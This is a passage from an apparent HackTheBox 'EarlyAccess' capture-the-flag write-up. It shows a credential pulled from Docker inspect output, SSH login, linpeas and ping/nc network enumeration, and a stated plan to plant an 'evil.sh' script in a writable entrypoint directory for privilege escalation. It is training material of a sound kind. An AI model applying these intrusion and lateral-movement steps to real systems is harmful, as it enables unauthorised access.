class="st">"/var/lib/mysql"</span><span class="op">,</span><span class="st">"Driver"</span><span class="dt">:</span><span class="st">"local"</span><span class="op">,</span><span class="st">"Mode"</span><span class="dt">:</span><span class="st">"rw"</span><span class="op">,</span><span class="st">"Name"</span><span class="dt">:</span><span class="st">"app_vol_mysql"</span><span class="op">,</span><span class="st">"Propagation"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"RW"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"Source"</span><span class="dt">:</span><span class="st">"/var/lib/docker/volumes/app_vol_mysql/_data"</span><span class="op">,</span><span class="st">"Type"</span><span class="dt">:</span><span class="st">"volume"</span><span class="dt">}</span><span class="ex">],</span><span class="st">"Name"</span><span class="ex">:</span><span class="st">"/mysql"</span><span class="ex">,</span><span class="st">"NetworkSettings"</span><span class="ex">:{</span><span class="st">"Bridge"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"EndpointID"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"Gateway"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"GlobalIPv6Address"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"GlobalIPv6PrefixLen"</span><span class="ex">:0,</span><span class="st">"HairpinMode"</span><span class="ex">:false,</span><span class="st">"IPAddress"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"IPPrefixLen"</span><span class="ex">:0,</span><span class="st">"IPv6Gateway"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"LinkLocalIPv6Address"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"LinkLocalIPv6PrefixLen"</span><span class="ex">:0,</span><span class="st">"MacAddress"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"Networks"</span><span class="ex">:{</span><span class="st">"app_nw"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"Aliases"</span><span class="dt">:[</span><span class="st">"mysql"</span><span class="op">,</span><span class="st">"2a285912567e"</span><span class="dt">]</span><span class="op">,</span><span class="st">"DriverOpts"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"EndpointID"</span><span class="dt">:</span><span class="st">"cdc013f43c805abdca5bfedb447532433c8e53038fabc3bb1c5ca751d81eb80e"</span><span class="op">,</span><span class="st">"Gateway"</span><span class="dt">:</span><span class="st">"172.18.0.1"</span><span class="op">,</span><span class="st">"GlobalIPv6Address"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"GlobalIPv6PrefixLen"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"IPAMConfig"</span><span class="dt">:{</span><span class="st">"IPv4Address"</span><span class="dt">:</span><span class="st">"172.18.0.100"</span><span class="dt">}</span><span class="op">,</span><span class="st">"IPAddress"</span><span class="dt">:</span><span class="st">"172.18.0.100"</span><span class="op">,</span><span class="st">"IPPrefixLen"</span><span class="dt">:16</span><span class="op">,</span><span class="st">"IPv6Gateway"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"Links"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"MacAddress"</span><span class="dt">:</span><span class="st">"02:42:ac:12:00:64"</span><span class="op">,</span><span class="st">"NetworkID"</span><span class="dt">:</span><span class="st">"cbb68a9f4bde079475a89a8c2948fb188abf9caa5d7ccb2c1c50844dc9935b3e"</span><span class="dt">}</span><span class="ex">},</span><span class="st">"Ports"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"3306/tcp"</span><span class="dt">:null</span><span class="op">,</span><span class="st">"33060/tcp"</span><span class="dt">:null}</span><span class="ex">,</span><span class="st">"SandboxID"</span><span class="ex">:</span><span class="st">"e9b084f4253b9d40bdd32b1c18ef6fddd03977dddcfbb8d3422bfef7d89d3e3c"</span><span class="ex">,</span><span class="st">"SandboxKey"</span><span class="ex">:</span><span class="st">"/var/run/docker/netns/e9b084f4253b"</span><span class="ex">,</span><span class="st">"SecondaryIPAddresses"</span><span class="ex">:null,</span><span class="st">"SecondaryIPv6Addresses"</span><span class="ex">:null},</span><span class="st">"Path"</span><span class="ex">:</span><span class="st">"docker-entrypoint.sh"</span><span class="ex">,</span><span class="st">"Platform"</span><span class="ex">:</span><span class="st">"linux"</span><span class="ex">,</span><span class="st">"ProcessLabel"</span><span class="ex">:</span><span class="st">""</span><span class="ex">,</span><span class="st">"ResolvConfPath"</span><span class="ex">:</span><span class="st">"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/resolv.conf"</span><span class="ex">,</span><span class="st">"RestartCount"</span><span class="ex">:0,</span><span class="st">"State"</span><span class="ex">:</span><span class="dt">{</span><span class="st">"Dead"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Error"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"FinishedAt"</span><span class="dt">:</span><span class="st">"0001-01-01T00:00:00Z"</span><span class="op">,</span><span class="st">"Health"</span><span class="dt">:{</span><span class="st">"FailingStreak"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Log"</span><span class="dt">:[{</span><span class="st">"End"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:49.677779624+02:00"</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Output"</span><span class="dt">:</span><span class="st">"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n"</span><span class="op">,</span><span class="st">"Start"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:49.591002515+02:00"</span><span class="dt">}</span><span class="op">,</span><span class="dt">{</span><span class="st">"End"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:54.762145333+02:00"</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Output"</span><span class="dt">:</span><span class="st">"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n"</span><span class="op">,</span><span class="st">"Start"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:54.681668413+02:00"</span><span class="dt">}</span><span class="op">,</span><span class="dt">{</span><span class="st">"End"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:59.846907812+02:00"</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Output"</span><span class="dt">:</span><span class="st">"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n"</span><span class="op">,</span><span class="st">"Start"</span><span class="dt">:</span><span class="st">"2021-09-16T16:17:59.76533343+02:00"</span><span class="dt">}</span><span class="op">,</span><span class="dt">{</span><span class="st">"End"</span><span class="dt">:</span><span class="st">"2021-09-16T16:18:04.934944592+02:00"</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Output"</span><span class="dt">:</span><span class="st">"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n"</span><span class="op">,</span><span class="st">"Start"</span><span class="dt">:</span><span class="st">"2021-09-16T16:18:04.849003146+02:00"</span><span class="dt">}</span><span class="op">,</span><span class="dt">{</span><span class="st">"End"</span><span class="dt">:</span><span class="st">"2021-09-16T16:18:10.017393625+02:00"</span><span class="op">,</span><span class="st">"ExitCode"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"Output"</span><span class="dt">:</span><span class="st">"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\nmysqld is alive\n"</span><span class="op">,</span><span class="st">"Start"</span><span class="dt">:</span><span class="st">"2021-09-16T16:18:09.937871649+02:00"</span><span class="dt">}]</span><span class="op">,</span><span class="st">"Status"</span><span class="dt">:</span><span class="st">"healthy"</span><span class="dt">}</span><span class="op">,</span><span class="st">"OOMKilled"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Paused"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Pid"</span><span class="dt">:1097</span><span class="op">,</span><span class="st">"Restarting"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"Running"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"StartedAt"</span><span class="dt">:</span><span class="st">"2021-09-16T13:38:17.332306321Z"</span><span class="op">,</span><span class="st">"Status"</span><span class="dt">:</span><span class="st">"running"</span><span class="dt">}</span><span class="ex">},</span><span class="st">"status"</span><span class="ex">:200}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In the output we find SQL root creds - <strong><code>drew:XeoNu86JTznxMCQuGHrGutF3Csq5</code></strong></p>
<p>Login with SSH and grab user.txt</p>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ssh drew@earlyaccess.htb</span>
<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:~$</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span></span>
<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a><span class="ex">earlyaccess</span></span>
<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb44-8"><a href="#cb44-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:~$</span> cat user.txt </span>
<span id="cb44-9"><a href="#cb44-9" aria-hidden="true" tabindex="-1"></a><span class="ex">b6ca7af4c496986e5632265206169ea4</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Enumerating manually (and with linpeas) we quickly find that <code>/opt/docker-entrypoint.d/</code> is owned by group <code>drew</code>, testing to add content in the directory reveals that it’s auto cleaned frequently.</p>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:~$</span> ./linpeas.sh </span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a><span class="ex">╔══════════╣</span> Active Ports</span>
<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports</span>
<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 0.0.0.0:22              0.0.0.0:<span class="pp">*</span>               LISTEN         </span>
<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 0.0.0.0:443             0.0.0.0:<span class="pp">*</span>               LISTEN   </span>
<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 0.0.0.0:8443            0.0.0.0:<span class="pp">*</span>               LISTEN  </span>
<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 0.0.0.0:80              0.0.0.0:<span class="pp">*</span>               LISTEN  </span>
<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb45-12"><a href="#cb45-12" aria-hidden="true" tabindex="-1"></a><span class="ex">╔══════════╣</span> Interesting GROUP writable files <span class="er">(</span><span class="ex">not</span> in Home<span class="kw">)</span> <span class="kw">(</span><span class="ex">max</span> 500<span class="kw">)</span></span>
<span id="cb45-13"><a href="#cb45-13" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files</span>
<span id="cb45-14"><a href="#cb45-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Group</span> drew:</span>
<span id="cb45-15"><a href="#cb45-15" aria-hidden="true" tabindex="-1"></a><span class="ex">/opt/docker-entrypoint.d</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Port 8443 is new to us, but we are unable to access it.</p>
<div class="sourceCode" id="cb46"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/opt/docker-entrypoint.d$</span> curl <span class="at">-k</span> https://127.0.0.1:8443</span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl:</span> <span class="er">(</span><span class="ex">7</span><span class="kw">)</span> <span class="ex">Failed</span> to connect to 127.0.0.1 port 8443: Connection refused</span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Iptables</span> rules:</span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a><span class="ex">*filter</span></span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-A</span> INPUT <span class="at">-p</span> tcp <span class="at">-m</span> tcp <span class="at">--dport</span> 8443 <span class="at">-j</span> REJECT <span class="at">--reject-with</span> tcp-reset</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>After some further enumeration we find a mail from game-adm in <code>/var/mail/drew</code> &gt;To: <a href="mailto:drew@earlyaccess.htb" class="email">drew@earlyaccess.htb</a> Subject: Game-server crash fixes From: game-adm <a href="mailto:game-adm@earlyaccess.htb" class="email">game-adm@earlyaccess.htb</a> Date: Thu May 27 8:10:34 2021 &gt; Hi Drew! &gt; Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it…) If the game hangs now, the server will restart and be available again after about a minute. &gt; If you find any other problems, please don’t hesitate to report them! &gt; Thank you for your efforts! Game-adm (and the entire EarlyAccess Studios team).</p>
<p>My guess here is that we should crash the game server, thus restarting the service and running scripts in <code>/opt/docker-entrypoint.d/</code> - where we will put our own <code>evil.sh</code> script.</p>
<hr>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>So we’re looking for a game-server. We can assume it’s in one of the three docker networks:</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">3:</span> docker0: <span class="op">&lt;</span>NO-CARRIER,BROADCAST,MULTICAST,UP<span class="op">&gt;</span> mtu 1500 qdisc noqueue state DOWN group default </span>
<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">link/ether</span> 02:42:0e:38:a3:58 brd ff:ff:ff:ff:ff:ff</span>
<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">inet</span> 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span>
<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a>       <span class="ex">valid_lft</span> forever preferred_lft forever</span>
<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a><span class="ex">4:</span> br-cbb68a9f4bde: <span class="op">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="op">&gt;</span> mtu 1500 qdisc noqueue state UP group default </span>
<span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">link/ether</span> 02:42:e3:e7:9c:c2 brd ff:ff:ff:ff:ff:ff</span>
<span id="cb47-7"><a href="#cb47-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">inet</span> 172.18.0.1/16 brd 172.18.255.255 scope global br-cbb68a9f4bde</span>
<span id="cb47-8"><a href="#cb47-8" aria-hidden="true" tabindex="-1"></a>       <span class="ex">valid_lft</span> forever preferred_lft forever</span>
<span id="cb47-9"><a href="#cb47-9" aria-hidden="true" tabindex="-1"></a><span class="ex">5:</span> br-34ef5fd49320: <span class="op">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="op">&gt;</span> mtu 1500 qdisc noqueue state UP group default </span>
<span id="cb47-10"><a href="#cb47-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">link/ether</span> 02:42:60:7b:7f:e1 brd ff:ff:ff:ff:ff:ff</span>
<span id="cb47-11"><a href="#cb47-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">inet</span> 172.19.0.1/16 brd 172.19.255.255 scope global br-34ef5fd49320</span>
<span id="cb47-12"><a href="#cb47-12" aria-hidden="true" tabindex="-1"></a>       <span class="ex">valid_lft</span> forever preferred_lft forever</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The webserver that we have access to previously (User Step 7) was on 172.18.0.102 and the API 172.18.0.101, so probably everything related to web is on that subnet. Hopefully, all the other hosts are on 172.1X.__0__.XXX, we can do a ping sweep loop and try to find any hosts.</p>
<div class="sourceCode" id="cb48"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> for i in <span class="dt">{</span><span class="dv">2</span><span class="dt">..</span><span class="dv">254</span><span class="dt">}</span> <span class="kw">;</span><span class="cf">do</span> <span class="kw">(</span><span class="fu">ping</span> <span class="at">-c</span> 1 172.17.0.<span class="va">$i</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">"bytes from"</span> <span class="kw">&amp;)</span> <span class="kw">;</span><span class="cf">done</span></span>
<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> for i in <span class="dt">{</span><span class="dv">2</span><span class="dt">..</span><span class="dv">254</span><span class="dt">}</span> <span class="kw">;</span><span class="cf">do</span> <span class="kw">(</span><span class="fu">ping</span> <span class="at">-c</span> 1 172.18.0.<span class="va">$i</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">"bytes from"</span> <span class="kw">&amp;)</span> <span class="kw">;</span><span class="cf">done</span></span>
<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.065 ms</span>
<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.18.0.101: icmp_seq=1 ttl=64 time=0.108 ms</span>
<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.18.0.100: icmp_seq=1 ttl=64 time=0.070 ms</span>
<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.18.0.102: icmp_seq=1 ttl=64 time=0.068 ms</span>
<span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> for i in <span class="dt">{</span><span class="dv">2</span><span class="dt">..</span><span class="dv">254</span><span class="dt">}</span> <span class="kw">;</span><span class="cf">do</span> <span class="kw">(</span><span class="fu">ping</span> <span class="at">-c</span> 1 172.19.0.<span class="va">$i</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">"bytes from"</span> <span class="kw">&amp;)</span> <span class="kw">;</span><span class="cf">done</span></span>
<span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.128 ms</span>
<span id="cb48-9"><a href="#cb48-9" aria-hidden="true" tabindex="-1"></a><span class="ex">64</span> bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.106 ms</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Scan the hosts with nc to find open ports.</p>
<div class="sourceCode" id="cb49"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> nc <span class="at">-zvn</span> 172.19.0.4 1-65500</span>
<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> nc <span class="at">-zvn</span> 172.19.0.2 1-65500</span>
<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.19.0.2]</span> 9999 <span class="er">(</span><span class="ex">?</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.19.0.2]</span> 22 <span class="er">(</span><span class="fu">ssh</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-5"><a href="#cb49-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> nc <span class="at">-zvn</span> 172.18.0.100 1-65500</span>
<span id="cb49-6"><a href="#cb49-6" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.18.0.100]</span> 33060 <span class="er">(</span><span class="ex">?</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-7"><a href="#cb49-7" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.18.0.100]</span> 3306 <span class="er">(</span><span class="ex">mysql</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-8"><a href="#cb49-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> nc <span class="at">-zvn</span> 172.18.0.101 1-65500</span>
<span id="cb49-9"><a href="#cb49-9" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.18.0.101]</span> 5000 <span class="er">(</span><span class="ex">?</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-10"><a href="#cb49-10" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> nc <span class="at">-zvn</span> 172.18.0.102 1-65500</span>
<span id="cb49-11"><a href="#cb49-11" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.18.0.102]</span> 443 <span class="er">(</span><span class="ex">https</span><span class="kw">)</span> <span class="ex">open</span></span>
<span id="cb49-12"><a href="#cb49-12" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[172.18.0.102]</span> 80 <span class="er">(</span><span class="ex">http</span><span class="kw">)</span> <span class="ex">open</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>172.19.0.2:9999 looks like it could be our game-server.</p>
<div class="sourceCode" id="cb50"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a>drew@earlyaccess:/var/mail$ curl http://172.19.0.2:9999</span>
<span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> html<span class="dt">&gt;</span></span>
<span id="cb50-3"><a href="#cb50-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="ot"> lang</span><span class="op">=</span><span class="st">"en"</span><span class="dt">&gt;</span></span>
<span id="cb50-4"><a href="#cb50-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">head</span><span class="dt">&gt;</span></span>
<span id="cb50-5"><a href="#cb50-5" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;</span><span class="kw">title</span><span class="dt">&gt;</span>Rock v0.0.1<span class="dt">&lt;/</span><span class="kw">title</span><span class="dt">&gt;</span></span>
<span id="cb50-6"><a href="#cb50-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">head</span><span class="dt">&gt;</span></span>
<span id="cb50-7"><a href="#cb50-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb50-8"><a href="#cb50-8" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"container"</span><span class="dt">&gt;</span></span>
<span id="cb50-9"><a href="#cb50-9" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"panel panel-default"</span><span class="dt">&gt;</span></span>
<span id="cb50-10"><a href="#cb50-10" aria-hidden="true" tabindex="-1"></a>                <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"panel-heading"</span><span class="dt">&gt;&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Game version v0.0.1<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-11"><a href="#cb50-11" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"panel-body"</span><span class="dt">&gt;</span></span>
<span id="cb50-12"><a href="#cb50-12" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"card header"</span><span class="dt">&gt;</span></span>
<span id="cb50-13"><a href="#cb50-13" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">"card-header"</span><span class="dt">&gt;</span></span>
<span id="cb50-14"><a href="#cb50-14" aria-hidden="true" tabindex="-1"></a>                                Test-environment for Game-dev</span>
<span id="cb50-15"><a href="#cb50-15" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-16"><a href="#cb50-16" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-17"><a href="#cb50-17" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">&lt;</span><span class="kw">h2</span><span class="dt">&gt;</span>Choose option<span class="dt">&lt;/</span><span class="kw">h2</span><span class="dt">&gt;</span></span>
<span id="cb50-18"><a href="#cb50-18" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-19"><a href="#cb50-19" aria-hidden="true" tabindex="-1"></a>                                    <span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">"/autoplay"</span><span class="dt">&gt;&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">"x"</span><span class="ot"> alt</span><span class="op">=</span><span class="st">"autoplay"</span><span class="er">&lt;/</span><span class="ot">a</span><span class="dt">&gt;</span></span>
<span id="cb50-20"><a href="#cb50-20" aria-hidden="true" tabindex="-1"></a>                                    <span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">"/rock"</span><span class="dt">&gt;&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">"x"</span><span class="ot"> alt</span><span class="op">=</span><span class="st">"rock"</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span> </span>
<span id="cb50-21"><a href="#cb50-21" aria-hidden="true" tabindex="-1"></a>                                    <span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">"/paper"</span><span class="dt">&gt;&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">"x"</span><span class="ot"> alt</span><span class="op">=</span><span class="st">"paper"</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span>
